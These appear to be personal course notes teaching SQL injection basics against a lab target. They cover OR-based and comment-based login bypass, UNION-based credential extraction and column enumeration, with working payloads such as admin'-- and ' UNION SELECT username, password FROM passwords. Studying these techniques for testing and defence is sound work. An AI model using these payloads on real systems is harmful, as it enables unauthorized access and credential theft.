# Subverting Query Logic
### Authentication Bypass

![[Pasted image 20250605143810.png]]
We can log in with the administrator credentials admin / p@ssw0rd.
![[Pasted image 20250605143818.png]]

Web login forms often use SQL queries like:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

The goal of SQLi in this context is to bypass authentication by altering query logic using injection.
### Step 1: Test for SQLi Vulnerability

Try injecting payloads in the input fields to observe abnormal behavior or syntax errors:

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

```sql
SELECT * FROM logins WHERE username=''' AND password='something';
```

Result: SQL syntax error due to unbalanced quotes.
### Step 2: OR-based SQL Injection

Injecting the OR condition to force the WHERE clause to always return true.

Injected Username:

```sql
admin' or '1'='1
```

Final query:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='something';
```
#### Logical Evaluation:

- `AND` evaluated before `OR`    
- `password='something'` evaluates to false
- `OR '1'='1'` ensures the entire query returns true

Result: Login successful.
### Step 3: Auth Bypass without Known Username

If username is unknown:  
Inject in password field:

Payload:

```sql
something' or '1'='1
```

Query becomes:

```sql
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1';
```

OR inject both fields:

```sql
username = '' or '1'='1
password = 'anything' or '1'='1
```

Result: Bypasses authentication by evaluating WHERE clause to true.
### Key Takeaways

- Exploits logical flaws in SQL statement evaluation    
- Common payload: `' or '1'='1`
- Works due to OR operator precedence
- Can bypass auth with or without valid usernames
- Comments and quote balancing can assist in injection success

> Refer to PayloadAllTheThings repo for more variations of auth bypass payloads.
# Using Comments in SQLi

### Purpose

To understand how to leverage SQL comments to manipulate query logic for SQL injection attacks, particularly authentication bypass scenarios.
### SQL Comments Syntax

- Line Comments:    
    - `--` (double dash followed by a space)
    - `#` (hash symbol)
- Inline Comment:
    - `/* comment */` (not commonly used in SQLi)

> Note: `--` must be followed by a space or it won’t be recognized as a comment.

Examples:

```sql
-- This is a comment
# This is also a comment
```
### Commenting Out Part of the Query

To ignore the rest of a SQL statement:

```sql
SELECT * FROM logins WHERE username='admin'-- AND password='wrong';
```

This ignores the `AND password='wrong'` part and executes only:

```sql
SELECT * FROM logins WHERE username='admin'
```
### Authentication Bypass Example

Given a login form executing:

```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

Injecting in the username:

```
admin'--
```

Final query:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password='anything';
```

Bypasses password check entirely.

> Works because the comment nullifies the rest of the WHERE clause.
### Using Comments with Parentheses

If the original query includes parenthesis:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';
```

Injecting:

```
admin')--
```

Final query becomes:

```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='hash';
```

Which successfully bypasses the condition on `id` and `password`, and logs in as admin.
### Special Note on URL Encoded Inputs

- URL encoded space: `+`
- Comment payload in URL: `--+`
- URL encoded `#`: `%23`

When injecting via URL, make sure to encode the payloads accordingly.
### Summary

- SQL comments (`--`, `#`) are powerful for breaking query logic.    
- Used to terminate conditions or clauses in login forms.
- Parentheses must be matched when closing conditions.
- Comments allow injecting partial queries and skipping constraints like password check or ID limits.
# Union Clause - SQL Injection Fundamentals
### Introduction to UNION

The `UNION` SQL clause allows combining the result set of two or more `SELECT` statements. This capability can be abused during SQL injection to extract information from multiple tables or databases.
### Basic Example

```sql
SELECT * FROM ports;
```

Output:

```
| code   | city      |
|--------|-----------|
| CN SHA | Shanghai  |
| SG SIN | Singapore |
| ZZ-21  | Shenzhen  |
```

```sql
SELECT * FROM ships;
```

Output:

```
| Ship     | city     |
|----------|----------|
| Morrison | New York |
```

Using `UNION` to combine:

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

Output:

```
| code     | city      |
|----------|-----------|
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
| Morrison | New York  |
```
###  Important Rules for UNION

- All `SELECT` statements combined with `UNION` must have the same number of columns.    
- The data types of corresponding columns must be compatible.

Error Example:

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

Error: `ERROR 1222 (21000): The used SELECT statements have a different number of columns`
### Exploiting UNION for SQL Injection

Example vulnerable query:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

Injection payload:

```sql
' UNION SELECT username, password FROM passwords-- '
```

Assumes the `products` table has 2 columns. This query extracts credentials from the `passwords` table.
### Uneven Columns Workaround

If the table you target has fewer/more columns than your injection:

- Fill extra columns with dummy values: numbers or `NULL`
- Ensure correct data types to avoid syntax errors

Example: Original query has 4 columns:

```sql
UNION SELECT username, 2, 3, 4 FROM passwords-- '
```

Output:

```
| product_1 | product_2 | product_3 | product_4 |
|-----------|-----------|-----------|-----------|
| admin     |     2     |     3     |     4     |
```

Use dummy integers to:

- Avoid type mismatch
- Track column positions
### Pro Tip

Use `NULL` instead of static values when unsure of types:

```sql
UNION SELECT username, NULL, NULL, NULL FROM passwords-- '
```

This maintains compatibility with any data type.

This method of `UNION`-based injection enables an attacker to dump sensitive data across tables/databases in a single manipulated query.
# Union Injection

Now that we know how the UNION clause works and how to use it, let us learn how to utilize it in SQL injection.

Example target:

```
http://SERVER_IP:PORT/search.php?port_code=cn
```

This page accepts user input via a search field and displays results in a table (Port Code, Port City, Port Volume).
#### SQLi Discovery

Injecting a single quote (`'`) causes an error:

```
You have an error in your SQL syntax...
```

This indicates that the page may be vulnerable to SQL injection.
### Detecting Number of Columns

To craft a working UNION-based injection, we must first determine how many columns the original query returns. Two methods:
#### Method 1: ORDER BY

Increment column index in ORDER BY until error occurs:

- `' ORDER BY 1-- -` → Success    
- `' ORDER BY 2-- -` → Success
- `' ORDER BY 3-- -` → Success    
- `' ORDER BY 4-- -` → Success    
- `' ORDER BY 5-- -` → Error    

**Conclusion: The query has 4 columns.**

#### Method 2: UNION SELECT

Inject UNION statements with increasing column counts:

- `cn' UNION SELECT 1,2,3-- -` → Error
- `cn' UNION SELECT 1,2,3,4-- -` → Success

**Conclusion: The query has 4 columns.**
### Determining Printed Columns

Use numeric values to identify which columns are printed on the page:

```
cn' UNION SELECT 1,2,3,4-- -
```

If only `2`, `3`, and `4` are displayed, then only columns 2-4 are reflected back to the user.
#### Extracting Real Data

Replace one of the displayed numeric values with a SQL expression to test data retrieval:

```
cn' UNION SELECT 1,@@version,3,4-- -
```

Output:

```
10.3.22-MariaDB-1ubuntu1, 3, 4
```

This confirms the injection works and that column 2 is a good place for data extraction.
# Tags
> #Exploitation #Service-Exploitation #MySQL